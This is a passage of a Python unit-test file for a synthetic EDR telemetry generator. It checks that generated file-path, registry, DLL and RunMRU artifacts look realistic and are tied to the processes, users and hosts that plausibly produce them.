# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Unit tests for EDR pools YAML loader."""

import random
import re
from datetime import UTC, datetime, timedelta
from unittest.mock import patch

import pytest

from evidenceforge.generation.activity.edr_pools import (
    _sanitize_edr_pools,
    defender_platform_version,
    file_path_templates_for_process,
    file_path_templates_for_user,
    get_dll_pool,
    get_file_paths,
    get_registry_keys_hkcu,
    get_registry_keys_hklm,
    is_service_account,
    load_edr_pools,
    materialize_edr_template,
    materialize_edr_template_group,
    materialize_registry_effect,
    normalize_defender_platform_path,
    registry_entries_for_process,
    registry_value_type,
    select_ambient_file_churn_effect,
    select_command_file_side_effect,
    select_file_side_effect,
)


class TestLoadEdrPools:
    """Test that the YAML loads correctly with all sections."""

    def test_all_sections_present(self):
        pools = load_edr_pools()
        assert "file_paths_windows" in pools
        assert "file_paths_linux" in pools
        assert "registry_keys_hkcu" in pools
        assert "registry_keys_hklm" in pools
        assert "dll_pool" in pools
        assert "runmru_commands" in pools
        assert "registry_mru_filenames" in pools
        assert "installed_software_products" in pools
        assert "group_policy_extension_guids" in pools

    def test_all_sections_non_empty(self):
        pools = load_edr_pools()
        for key in [
            "file_paths_windows",
            "file_paths_linux",
            "registry_keys_hkcu",
            "registry_keys_hklm",
            "dll_pool",
            "runmru_commands",
            "registry_mru_filenames",
            "file_side_effect_profiles",
            "installed_software_products",
            "group_policy_extension_guids",
        ]:
            assert len(pools[key]) > 0, f"{key} is empty"

    def test_default_windows_file_paths_exclude_protected_event_logs(self):
        paths = get_file_paths("windows")

        assert not any(r"\winevt\Logs" in path for path in paths)

    def test_read_only_recon_tool_has_no_file_side_effect(self):
        import random

        effect = select_file_side_effect(
            process_name=r"C:\Windows\System32\dsquery.exe",
            command_line='dsquery.exe group -name "Domain Admins"',
            os_category="windows",
            rng=random.Random(5),
            user="alice",
        )

        assert effect is None

    def test_browser_side_effect_uses_browser_cache_profile(self):
        import random

        effect = select_file_side_effect(
            process_name=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            command_line="chrome.exe --type=renderer",
            os_category="windows",
            rng=random.Random(5),
            user="alice",
        )

        assert effect is not None
        action, path = effect
        assert action in {"create", "modify"}
        assert "cache" in path.lower()
        assert "Security.evtx" not in path

    def test_browser_side_effect_matches_executable_family(self):
        import random

        cases = [
            (
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                "chrome.exe --type=renderer",
                r"google\chrome",
            ),
            (
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                "msedge.exe --type=renderer",
                r"microsoft\edge",
            ),
            (
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                "firefox.exe -contentproc",
                r"mozilla\firefox",
            ),
        ]

        for process_name, command_line, expected_path_fragment in cases:
            effect = select_file_side_effect(
                process_name=process_name,
                command_line=command_line,
                os_category="windows",
                rng=random.Random(5),
                user="alice",
            )

            assert effect is not None
            _action, path = effect
            assert expected_path_fragment in path.lower()

    def test_service_accounts_do_not_receive_interactive_profile_side_effects(self):
        import random

        assert is_service_account("windows", "LOCAL SERVICE")
        assert is_service_account("linux", "systemd-timesync")

        windows_templates = file_path_templates_for_user(
            get_file_paths("windows"),
            "windows",
            "LOCAL SERVICE",
        )
        linux_templates = file_path_templates_for_user(
            get_file_paths("linux"),
            "linux",
            "systemd-timesync",
        )

        assert not any(path.startswith(r"C:\Users\{user}") for path in windows_templates)
        assert not any(path.startswith("/home/{user}/") for path in linux_templates)
        assert not any(path.startswith("/var/lib/dpkg/") for path in linux_templates)
        assert not any(path.startswith("/var/lib/apt/") for path in linux_templates)
        assert not any(path.startswith("/var/cache/apt/") for path in linux_templates)

        shell_effect = select_file_side_effect(
            process_name="/bin/bash",
            command_line="bash -lc true",
            os_category="linux",
            rng=random.Random(5),
            user="systemd-timesync",
        )
        assert shell_effect is None

    def test_non_root_package_manager_cannot_write_root_owned_state(self):
        effect = select_file_side_effect(
            process_name="/usr/bin/apt-get",
            command_line="apt-get update",
            os_category="linux",
            rng=random.Random(5),
            user="www-data",
        )

        assert effect is None

    def test_root_package_manager_keeps_package_state_side_effects(self):
        effect = select_file_side_effect(
            process_name="/usr/bin/apt-get",
            command_line="apt-get update",
            os_category="linux",
            rng=random.Random(5),
            user="root",
        )

        assert effect is not None
        _action, path = effect
        assert path.startswith(("/var/log/apt/", "/var/lib/dpkg/"))
        assert not path.startswith("/var/lib/dnf/")

    def test_root_dnf_keeps_only_rpm_state_side_effects(self):
        effect = select_file_side_effect(
            process_name="/usr/bin/dnf",
            command_line="dnf makecache --timer",
            os_category="linux",
            rng=random.Random(5),
            user="root",
        )

        assert effect == ("modify", "/var/lib/dnf/history.sqlite")


class TestFilePaths:
    """Test file path pool content."""

    def test_windows_has_templates(self):
        paths = get_file_paths("windows")
        assert any("{user}" in p for p in paths), "No {user} template in Windows paths"
        assert any("{rand}" in p for p in paths), "No {rand} template in Windows paths"

    def test_linux_has_templates(self):
        paths = get_file_paths("linux")
        assert any("{user}" in p for p in paths), "No {user} template in Linux paths"
        assert any("/home/" in p for p in paths), "No /home/ paths in Linux pool"

    def test_windows_paths_have_backslashes(self):
        paths = get_file_paths("windows")
        assert all("\\" in p for p in paths), "Windows paths should use backslashes"

    def test_linux_paths_have_forward_slashes(self):
        paths = get_file_paths("linux")
        assert all("/" in p for p in paths), "Linux paths should use forward slashes"

    def test_windows_prefetch_templates_are_not_generic_ambient_paths(self):
        paths = get_file_paths("windows")
        prefetch_paths = [
            path for path in paths if r"\windows\prefetch" in path.lower().replace("/", "\\")
        ]

        assert prefetch_paths == []

    def test_process_prefetch_side_effect_uses_owning_executable_name(self):
        profile = {
            "file_side_effect_profiles": [
                {
                    "name": "windows_prefetch_execution",
                    "executables": ["cmd.exe", "powershell.exe"],
                    "actions": ["modify"],
                    "probability": 1.0,
                    "paths_windows": [r"C:\Windows\Prefetch\{process_prefetch_name}-{hex}.pf"],
                }
            ],
        }
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value=profile,
        ):
            cmd_effect = select_file_side_effect(
                process_name=r"C:\Windows\System32\cmd.exe",
                command_line="cmd.exe /c whoami",
                os_category="windows",
                rng=random.Random(7),
                user="alice",
            )
            powershell_effect = select_file_side_effect(
                process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                command_line="powershell.exe -NoProfile Get-Process",
                os_category="windows",
                rng=random.Random(11),
                user="alice",
            )

        assert cmd_effect is not None
        assert powershell_effect is not None
        assert cmd_effect[0] == "modify"
        assert powershell_effect[0] == "modify"
        assert re.search(r"\\Prefetch\\CMD\.EXE-[0-9A-F]{8}\.pf$", cmd_effect[1])
        assert re.search(
            r"\\Prefetch\\POWERSHELL\.EXE-[0-9A-F]{8}\.pf$",
            powershell_effect[1],
        )

    def test_ambient_file_churn_filters_windows_prefetch_templates(self):
        effect = select_ambient_file_churn_effect(
            process_name=r"C:\Windows\System32\svchost.exe",
            command_line="svchost.exe -k netsvcs",
            os_category="windows",
            rng=random.Random(3),
            user="SYSTEM",
            path_templates=[r"C:\Windows\Prefetch\SVCHOST.EXE-{hex}.pf"],
            actions=["modify"],
            weights=[1],
        )

        assert effect is None

    def test_ambient_file_churn_filters_windows_protected_event_logs(self):
        effect = select_ambient_file_churn_effect(
            process_name=r"C:\Windows\System32\svchost.exe",
            command_line="svchost.exe -k netsvcs",
            os_category="windows",
            rng=random.Random(3),
            user="SYSTEM",
            path_templates=[r"C:\Windows\System32\winevt\Logs\Security.evtx"],
            actions=["modify"],
            weights=[1],
        )

        assert effect is None

    def test_generic_windows_paths_exclude_unowned_system_temp_template(self):
        """Generic churn must not assign one Windows Temp grammar to arbitrary processes."""
        paths = get_file_paths("windows")

        assert not any(path.startswith("C:\\Windows\\Temp\\") for path in paths)

        installer_paths = {
            effect[1]
            for seed in range(20)
            if (
                effect := select_file_side_effect(
                    process_name=r"C:\Windows\System32\msiexec.exe",
                    command_line="msiexec.exe /i package.msi /quiet",
                    os_category="windows",
                    rng=random.Random(seed),
                    user="SYSTEM",
                )
            )
            is not None
        }
        assert any(path.startswith(r"C:\Windows\Temp\MSI") for path in installer_paths)
        assert all(
            path.startswith(
                (r"C:\Windows\Temp\MSI", "C:\\Windows\\SoftwareDistribution\\Download\\")
            )
            for path in installer_paths
        )

    def test_linux_generic_paths_avoid_action_incompatible_sources(self):
        paths = get_file_paths("linux")
        assert not any(re.fullmatch(r"/proc/(?:\{rand\}|\d+)/status", path) for path in paths)
        assert "/etc/passwd" not in paths
        assert "/var/log/apache2/access.log" not in paths
        assert not any("systemd-private-" in path and "apache2.service" in path for path in paths)
        assert not any(path.startswith("/var/lib/dpkg/") for path in paths)
        assert not any(path.startswith("/var/lib/apt/") for path in paths)
        assert not any(path.startswith("/var/cache/apt/") for path in paths)

    def test_linux_service_ambient_churn_uses_daemon_profiles_not_generic_temp(self):
        generic_paths = get_file_paths("linux")
        actions = ["read", "modify", "create"]
        weights = [60, 30, 10]
        cases = [
            (
                "/usr/lib/systemd/systemd-timesyncd",
                "/usr/lib/systemd/systemd-timesyncd",
                "systemd-timesync",
            ),
            (
                "/usr/lib/systemd/systemd-resolved",
                "/usr/lib/systemd/systemd-resolved",
                "systemd-resolve",
            ),
            ("/usr/bin/dbus-daemon", "/usr/bin/dbus-daemon --system", "messagebus"),
            ("/usr/sbin/rsyslogd", "rsyslogd -n", "syslog"),
            ("/usr/sbin/NetworkManager", "/usr/sbin/NetworkManager --no-daemon", "root"),
            ("/usr/lib/snapd/snapd", "/usr/lib/snapd/snapd", "root"),
        ]

        for process_name, command_line, user in cases:
            effects = {
                select_ambient_file_churn_effect(
                    process_name,
                    command_line,
                    "linux",
                    random.Random(seed),
                    user,
                    generic_paths,
                    actions,
                    weights,
                )
                for seed in range(10)
            }

            assert all(effect is not None for effect in effects)
            expected_action = "read" if "dbus-daemon" in process_name else "modify"
            assert all(effect[0] == expected_action for effect in effects if effect is not None)
            assert not any(
                effect is not None
                and (effect[1].startswith(("/tmp/", "/var/tmp/")) or "/.cache-" in effect[1])
                for effect in effects
            )

    def test_linux_service_ambient_churn_skips_unprofiled_daemon_temp_fallback(self):
        effect = select_ambient_file_churn_effect(
            "/sbin/agetty",
            "/sbin/agetty --noclear tty1 linux",
            "linux",
            random.Random(5),
            "root",
            get_file_paths("linux"),
            ["create"],
            [1],
        )

        assert effect is None

    def test_application_service_principals_skip_generic_user_file_churn(self):
        for principal in ("dovecot", "meridian-app", "postfix"):
            effect = select_ambient_file_churn_effect(
                "/usr/libexec/vendor/service",
                "/usr/libexec/vendor/service --foreground",
                "linux",
                random.Random(5),
                principal,
                get_file_paths("linux"),
                ["create"],
                [1],
            )

            assert effect is None

    def test_dbus_ambient_state_is_read_only(self):
        effects = {
            select_ambient_file_churn_effect(
                "/usr/bin/dbus-daemon",
                "/usr/bin/dbus-daemon --system",
                "linux",
                random.Random(seed),
                "messagebus",
                get_file_paths("linux"),
                ["modify"],
                [1],
            )
            for seed in range(10)
        }

        assert all(effect is not None and effect[0] == "read" for effect in effects)

    def test_linux_web_daemon_ambient_churn_uses_matching_service_family(self):
        generic_paths = get_file_paths("linux")
        actions = ["read", "modify", "create"]
        weights = [60, 30, 10]

        apache_effects = {
            select_ambient_file_churn_effect(
                "/usr/sbin/apache2",
                "/usr/sbin/apache2 -DFOREGROUND",
                "linux",
                random.Random(seed),
                "www-data",
                generic_paths,
                actions,
                weights,
            )
            for seed in range(10)
        }
        nginx_effects = {
            select_ambient_file_churn_effect(
                "/usr/sbin/nginx",
                "nginx: worker process",
                "linux",
                random.Random(seed),
                "nginx",
                generic_paths,
                actions,
                weights,
            )
            for seed in range(10)
        }

        assert all(effect is not None for effect in apache_effects)
        assert all(effect is not None for effect in nginx_effects)
        assert all("/var/log/apache2/" in effect[1] for effect in apache_effects if effect)
        assert all(
            effect[1].startswith(("/var/log/nginx/", "/var/cache/nginx/"))
            for effect in nginx_effects
            if effect
        )

    def test_linux_sshd_churn_does_not_write_auth_log_directly(self):
        """Routine SSH auth-log writes should be owned by syslog/journald."""
        generic_paths = get_file_paths("linux")
        effects = {
            select_ambient_file_churn_effect(
                "/usr/sbin/sshd",
                "/usr/sbin/sshd -D",
                "linux",
                random.Random(seed),
                "root",
                generic_paths,
                ["read", "modify", "create"],
                [60, 30, 10],
            )
            for seed in range(20)
        }

        assert effects == {("read", "/etc/ssh/sshd_config")}


class TestRegistryKeys:
    """Test registry key pool content."""

    def test_hkcu_returns_3tuples(self):
        keys = get_registry_keys_hkcu()
        assert len(keys) >= 5
        for k, vname, details in keys:
            assert k.startswith("HKCU\\"), f"HKCU key doesn't start with HKCU\\: {k}"
            assert "\\" in k, f"Key missing backslash: {k}"
            assert vname, f"Value name is empty for key {k}"
            assert details, f"Details is empty for key {k}"

    def test_hklm_returns_3tuples(self):
        keys = get_registry_keys_hklm()
        assert len(keys) >= 4
        for k, vname, _details in keys:
            assert k.startswith("HKLM\\"), f"HKLM key doesn't start with HKLM\\: {k}"
            assert vname, f"Value name is empty for key {k}"

    def test_registry_details_are_realistic(self):
        """Details should be DWORD values or strings, not value names."""
        for _k, _vn, details in get_registry_keys_hklm():
            assert details.startswith("DWORD (") or not details.isupper(), (
                f"Details looks like a value name, not data: {details}"
            )

    def test_hklm_pool_excludes_host_role_specific_service_config(self):
        """Host-wide noise should not emit role-specific service/app config everywhere."""
        keys = get_registry_keys_hklm()
        rendered = [f"{key}\\{value_name}" for key, value_name, _details in keys]

        assert not any(r"Services\DNS\Parameters\ListenAddresses" in key for key in rendered)
        assert not any(r"App Paths\WinSCP.exe" in key for key in rendered)
        assert not any("WDigest" in key for key in rendered)

    def test_registry_artifacts_require_source_native_process_owners(self):
        entries = get_registry_keys_hkcu() + get_registry_keys_hklm()

        assert not any(
            "Component Based Servicing" in key
            for key, _name, _value in registry_entries_for_process(entries, "svchost.exe")
        )
        assert any(
            "Component Based Servicing" in key
            for key, _name, _value in registry_entries_for_process(entries, "TiWorker.exe")
        )
        assert not any(
            "Microsoft\\Office" in key
            for key, _name, _value in registry_entries_for_process(entries, "powershell.exe")
        )
        assert any(
            "Microsoft\\Office" in key
            for key, _name, _value in registry_entries_for_process(entries, "WINWORD.EXE")
        )
        assert not any(
            "\\Excel\\" in key or "\\PowerPoint\\" in key
            for key, _name, _value in registry_entries_for_process(entries, "OUTLOOK.EXE")
        )
        assert not any(
            "\\Word\\" in key
            for key, _name, _value in registry_entries_for_process(entries, "EXCEL.EXE")
        )
        assert not any(
            "Internet Settings" in key
            for key, _name, _value in registry_entries_for_process(entries, "WINWORD.EXE")
        )
        assert not any(
            name in {"EnableLUA", "SecurityHealthSystray"}
            for _key, name, _value in registry_entries_for_process(entries, "dllhost.exe")
        )
        assert any(
            name == "NoAutoUpdate"
            for _key, name, _value in registry_entries_for_process(entries, "usoclient.exe")
        )
        assert not any(
            "SearchboxTaskbarMode" == name
            for _key, name, _value in registry_entries_for_process(entries, "powershell.exe")
        )
        assert any(
            "SearchboxTaskbarMode" == name
            for _key, name, _value in registry_entries_for_process(entries, "explorer.exe")
        )
        assert not any(
            "Windows Defender\\Exclusions" in key
            for key, _name, _value in registry_entries_for_process(entries, "MsMpEng.exe")
        )


def test_windows_ambient_file_artifacts_require_source_native_process_owners():
    templates = get_file_paths("windows")

    generic = file_path_templates_for_process(templates, "svchost.exe")
    assert not any("\\WER\\ReportQueue\\" in path for path in generic)
    assert not any("\\DetectionHistory\\" in path for path in generic)
    assert not any("\\SoftwareDistribution\\" in path for path in generic)

    defender = file_path_templates_for_process(templates, "MsMpEng.exe")
    assert any("\\DetectionHistory\\" in path for path in defender)

    servicing = file_path_templates_for_process(templates, "TiWorker.exe")
    assert any("\\SoftwareDistribution\\" in path for path in servicing)


class TestDllPool:
    """Test DLL path pool content."""

    def test_contains_system32_and_application_dlls(self):
        dlls = get_dll_pool()
        assert len(dlls) >= 5
        assert any("System32" in d for d in dlls)
        assert any("Program Files" in d for d in dlls)

    def test_contains_common_dlls(self):
        dlls = get_dll_pool()
        dll_names = [d.rsplit("\\", 1)[-1].lower() for d in dlls]
        assert "ntdll.dll" in dll_names
        assert "kernel32.dll" in dll_names


class TestTemplateMaterialization:
    """Test EDR template placeholder expansion."""

    def test_materializes_registry_and_dll_placeholders(self):
        import random

        rng = random.Random(7)
        value = materialize_edr_template(
            r"HKCU\Software\Test\{guid}\Document {doc}\{hex}\{user}",
            rng,
            "alice",
        )

        assert "{guid}" not in value
        assert "{doc}" not in value
        assert "{hex}" not in value
        assert value.endswith(r"\alice")

    def test_materializes_guid_with_single_registry_braces(self):
        import random

        rng = random.Random(9)
        value = materialize_edr_template(r"Interfaces\{{{guid}}}\DhcpIPAddress", rng)

        assert "{{" not in value
        assert "}}" not in value
        assert value.startswith(r"Interfaces\{")
        assert value.endswith(r"}\DhcpIPAddress")

    def test_materializes_userassist_runpath_values(self):
        import random

        occurrence_time = datetime(2027, 8, 15, 14, 51, 15, 89067, tzinfo=UTC)
        key, value_name, details = materialize_edr_template_group(
            (
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count",
                "{userassist_value}",
                "{userassist_binary}",
            ),
            random.Random(17),
            "alice.smith",
            occurrence_time=occurrence_time,
        )

        assert "UserAssist" in key
        assert value_name.startswith("HRZR_EHACNGU:")
        assert not value_name.removeprefix("HRZR_EHACNGU").isdigit()
        assert "\\" in value_name
        detail_bytes = details.split()
        assert len(detail_bytes) == 72
        assert all(len(byte) == 2 for byte in detail_bytes)

        payload = bytes(int(byte, 16) for byte in detail_bytes)
        assert int.from_bytes(payload[4:8], "little") >= 1
        filetime = int.from_bytes(payload[60:68], "little")
        decoded = datetime(1601, 1, 1, tzinfo=UTC) + timedelta(microseconds=filetime // 10)
        assert decoded == occurrence_time

    def test_userassist_requires_occurrence_time(self):
        with pytest.raises(ValueError, match="requires occurrence_time"):
            materialize_edr_template("{userassist_binary}", random.Random(17))

    def test_registry_effect_keeps_userassist_time_monotonic_outside_march(self):
        template = (
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count",
            "{userassist_value}",
            "{userassist_binary}",
        )
        first_time = datetime(2027, 8, 15, 9, 0, tzinfo=UTC)
        second_time = first_time + timedelta(hours=3)

        first = materialize_registry_effect(template, random.Random(21), "alice.smith", first_time)
        second = materialize_registry_effect(
            template, random.Random(21), "alice.smith", second_time
        )

        assert first[1] == second[1]
        assert first[3] == second[3] == "binary"
        first_bytes = bytes.fromhex(first[2])
        second_bytes = bytes.fromhex(second[2])
        first_filetime = int.from_bytes(first_bytes[60:68], "little")
        second_filetime = int.from_bytes(second_bytes[60:68], "little")
        assert first_filetime < second_filetime

    def test_binary_registry_siblings_have_native_shapes(self):
        entries = get_registry_keys_hkcu()
        assert sum("UserAssist" in key for key, _name, _value in entries) == 1
        assert not any("hex:" in value.lower() for _key, _name, value in entries)

        occurrence_time = datetime(2027, 8, 15, 9, 0, tzinfo=UTC)
        accent_template = next(entry for entry in entries if entry[1] == "AccentPalette")
        _key, _name, accent, accent_type = materialize_registry_effect(
            accent_template, random.Random(31), "alice.smith", occurrence_time
        )
        assert accent_type == "binary"
        assert len(bytes.fromhex(accent)) == 32

        pidl_template = next(entry for entry in entries if "OpenSavePidlMRU" in entry[0])
        _key, _name, pidl, pidl_type = materialize_registry_effect(
            pidl_template, random.Random(32), "alice.smith", occurrence_time
        )
        pidl_bytes = bytes.fromhex(pidl)
        assert pidl_type == "binary"
        items, end_offset = self._decode_item_id_list(pidl_bytes)
        assert end_offset == len(pidl_bytes)
        assert items[0].startswith(b"\x1f\x50")
        assert items[1].startswith(b"\x2fC:\\")
        assert items[-1][0] == 0x32

    @staticmethod
    def _decode_item_id_list(data: bytes, offset: int = 0) -> tuple[list[bytes], int]:
        """Decode generic SHITEMID framing without relying on generator internals."""
        items: list[bytes] = []
        while True:
            assert offset + 2 <= len(data)
            item_size = int.from_bytes(data[offset : offset + 2], "little")
            offset += 2
            if item_size == 0:
                return items, offset
            assert item_size >= 3
            payload_end = offset + item_size - 2
            assert payload_end <= len(data)
            items.append(data[offset:payload_end])
            offset = payload_end

    @staticmethod
    def _filesystem_item_name(payload: bytes) -> str:
        assert payload[0] in {0x31, 0x32}
        return payload[12:].split(b"\x00", 1)[0].decode("windows-1252")

    def test_extension_specific_mru_artifacts_bind_key_and_filename_across_hosts(self):
        entries = [
            entry
            for entry in get_registry_keys_hkcu()
            if "OpenSavePidlMRU" in entry[0] or "RecentDocs" in entry[0]
        ]
        extension_entries = [entry for entry in entries if not entry[0].endswith(r"\*")]
        observed_hosts: set[str] = set()

        for host_index, host_key in enumerate(("WS-ALPHA-01", "WS-BRAVO-01", "WS-CHARLIE-01")):
            for entry_index, template in enumerate(extension_entries):
                key, _name, details, value_type = materialize_registry_effect(
                    template,
                    random.Random(100 * host_index + entry_index),
                    "alice.smith",
                    datetime(2027, 8, 15, 9, 0, tzinfo=UTC),
                    host_key=host_key,
                )
                expected_extension = key.rsplit("\\", 1)[-1].removeprefix(".").lower()
                data = bytes.fromhex(details)
                if "RecentDocs" in key:
                    leaf_name = data.decode("utf-16le").rstrip("\x00")
                else:
                    items, end_offset = self._decode_item_id_list(data)
                    assert end_offset == len(data)
                    leaf_name = self._filesystem_item_name(items[-1])
                assert leaf_name.rsplit(".", 1)[-1].lower() == expected_extension
                assert value_type == "binary"
                observed_hosts.add(host_key)

        assert len(observed_hosts) == 3

    def test_pidl_families_use_native_item_lists_and_distinct_last_visited_framing(self):
        entries = get_registry_keys_hkcu()
        open_save = next(entry for entry in entries if entry[0].endswith(r"OpenSavePidlMRU\pdf"))
        last_visited = next(entry for entry in entries if "LastVisitedPidlMRU" in entry[0])
        occurrence_time = datetime(2027, 8, 15, 9, 0, tzinfo=UTC)

        _key, _name, open_details, _type = materialize_registry_effect(
            open_save, random.Random(41), "alice.smith", occurrence_time
        )
        open_data = bytes.fromhex(open_details)
        open_items, open_end = self._decode_item_id_list(open_data)

        _key, _name, last_details, _type = materialize_registry_effect(
            last_visited, random.Random(42), "alice.smith", occurrence_time
        )
        last_data = bytes.fromhex(last_details)
        application_end = next(
            index
            for index in range(0, len(last_data) - 1, 2)
            if last_data[index : index + 2] == b"\x00\x00"
        )
        application = last_data[:application_end].decode("utf-16le")
        last_items, last_end = self._decode_item_id_list(last_data, application_end + 2)

        assert open_end == len(open_data)
        assert last_end == len(last_data)
        assert application.lower().endswith(".exe")
        assert [item[0] for item in open_items[:2]] == [0x1F, 0x2F]
        assert [item[0] for item in last_items[:2]] == [0x1F, 0x2F]
        assert self._filesystem_item_name(open_items[-1]).endswith(".pdf")
        assert b"C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00" not in open_data

    def test_registry_value_type_preserves_nonbinary_values(self):
        assert registry_value_type(r"HKLM\Software\Test\Enabled", "DWORD (0x00000001)") == ("dword")
        assert registry_value_type(r"HKLM\Software\Test\Name", "Example") == "string"

    def test_update_orchestrator_task_identity_is_host_stable(self):
        template = (
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\"
            "Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
            "Id",
            "{{{guid}}}",
        )

        first = materialize_edr_template_group(
            template,
            random.Random(1),
            host_key="WS-01",
        )
        second = materialize_edr_template_group(
            template,
            random.Random(99),
            host_key="WS-01",
        )
        other_host = materialize_edr_template_group(
            template,
            random.Random(1),
            host_key="WS-02",
        )

        assert first[2] == second[2]
        assert first[2] != other_host[2]

    def test_materializes_runmru_values_with_user_texture(self):
        import random

        outputs = {
            materialize_edr_template_group(
                (
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                    "{runmru_name}",
                    "{runmru_command}",
                ),
                random.Random(seed),
                "alice.smith",
            )
            for seed in range(24)
        }

        assert len({details for _key, _value_name, details in outputs}) >= 8
        assert all(details.endswith(r"\1") for _key, _value_name, details in outputs)
        assert any("alice.smith" in details for _key, _value_name, details in outputs)

    def test_runmru_command_treats_non_user_braces_as_literals(self):
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"runmru_commands": ["powershell.exe -Command { Get-Process }"]},
        ):
            key, _value_name, details = materialize_edr_template_group(
                (
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                    "{runmru_name}",
                    "{runmru_command}",
                ),
                random.Random(1),
                "alice",
            )

        assert key.endswith(r"RunMRU")
        assert details == r"powershell.exe -Command { Get-Process }\1"

    def test_runmru_command_does_not_interpret_format_specifiers(self):
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"runmru_commands": ["cmd.exe /c echo {user:1000000000}"]},
        ):
            details = materialize_edr_template("{runmru_command}", random.Random(3), "alice")

        assert details == r"cmd.exe /c echo {user:1000000000}\1"

    def test_runmru_command_preserves_domain_qualified_username(self):
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"runmru_commands": [r"cmd.exe /c echo {username}"]},
        ):
            details = materialize_edr_template(
                "{runmru_command}",
                random.Random(4),
                r"RBH\Marcus.Chen",
            )

        assert details == r"cmd.exe /c echo RBH\Marcus.Chen\1"

    def test_materializes_host_ip_context(self):
        import random

        value = materialize_edr_template("{host_ip}", random.Random(9), host_ip="10.10.2.20")

        assert value == "10.10.2.20"

    def test_materializes_dns_server_ip_context(self):
        import random

        value = materialize_edr_template(
            "{dns_server_ip}",
            random.Random(9),
            dns_server_ip="10.55.20.10",
        )

        assert value == "10.55.20.10"

    def test_materializes_interface_guid_stably_per_host_ip(self):
        import random

        template = r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}"
        first = materialize_edr_template(
            template,
            random.Random(1),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        second = materialize_edr_template(
            template,
            random.Random(999),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        other = materialize_edr_template(
            template,
            random.Random(1),
            host_ip="10.10.2.10",
            host_key="DC-01",
        )

        assert first == second
        assert first != other

    def test_materializes_group_interface_guid_stably_per_host_ip(self):
        import random

        templates = (
            r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}",
            "DhcpIPAddress",
            "{host_ip}",
        )
        first = materialize_edr_template_group(
            templates,
            random.Random(1),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        second = materialize_edr_template_group(
            templates,
            random.Random(999),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        other = materialize_edr_template_group(
            templates,
            random.Random(1),
            host_ip="10.10.2.10",
            host_key="DC-01",
        )

        assert first == second
        assert first != other
        assert first[2] == "10.10.2.20"

    def test_materializes_group_policy_extension_guid_from_pool(self):
        pool = {
            str(guid).strip().strip("{}").upper()
            for guid in load_edr_pools()["group_policy_extension_guids"]
        }
        template = (
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy"
            r"\State\Machine\Extension-List\{{{group_policy_extension_guid}}}"
        )

        values = {
            materialize_edr_template(template, random.Random(seed), host_key="WS-EBROOKS-01")
            for seed in range(40)
        }
        observed = {
            match.group(1).upper()
            for value in values
            if (
                match := re.search(
                    r"Extension-List\\\{([0-9A-Fa-f-]{36})\}$",
                    value,
                )
            )
        }

        assert observed
        assert observed <= pool
        assert len(observed) <= min(len(pool), 5)

    def test_materializes_group_policy_extension_guid_once_per_group(self):
        templates = (
            (
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy"
                r"\State\Machine\Extension-List\{{{group_policy_extension_guid}}}"
            ),
            "EndTimeHi",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History"
            r"\{{{group_policy_extension_guid}}}",
        )

        key, _value_name, details = materialize_edr_template_group(
            templates,
            random.Random(13),
            host_key="WS-EBROOKS-01",
        )

        key_guid = re.search(r"Extension-List\\\{([0-9A-Fa-f-]{36})\}$", key)
        details_guid = re.search(r"History\\\{([0-9A-Fa-f-]{36})\}$", details)
        assert key_guid is not None
        assert details_guid is not None
        assert key_guid.group(1) == details_guid.group(1)

    def test_materializes_group_dns_server_ip_context(self):
        import random

        templates = (
            r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
            "DhcpNameServer",
            "{dns_server_ip}",
        )
        key, value_name, details = materialize_edr_template_group(
            templates,
            random.Random(1),
            dns_server_ip="10.55.20.10",
        )

        assert key.endswith(r"Tcpip\Parameters")
        assert value_name == "DhcpNameServer"
        assert details == "10.55.20.10"

    def test_materializes_installed_product_identity_stably_per_host(self):
        product = {
            "name": "Contoso Endpoint Agent",
            "publisher": "Contoso Ltd.",
            "version": "8.4.2",
        }
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"installed_software_products": [product]},
        ):
            templates = (
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{{{installed_product_guid}}}",
                "DisplayName",
                "{installed_product_name}",
            )
            first = materialize_edr_template_group(
                templates,
                random.Random(1),
                host_key="WS-EBROOKS-01",
            )
            second = materialize_edr_template_group(
                templates,
                random.Random(999),
                host_key="WS-EBROOKS-01",
            )
            other_host = materialize_edr_template_group(
                templates,
                random.Random(1),
                host_key="WS-OTHER-01",
            )

        assert first == second
        assert first != other_host
        assert first[2] == "Contoso Endpoint Agent"

    def test_materializes_installed_product_related_values_together(self):
        product = {
            "name": "Contoso Endpoint Agent",
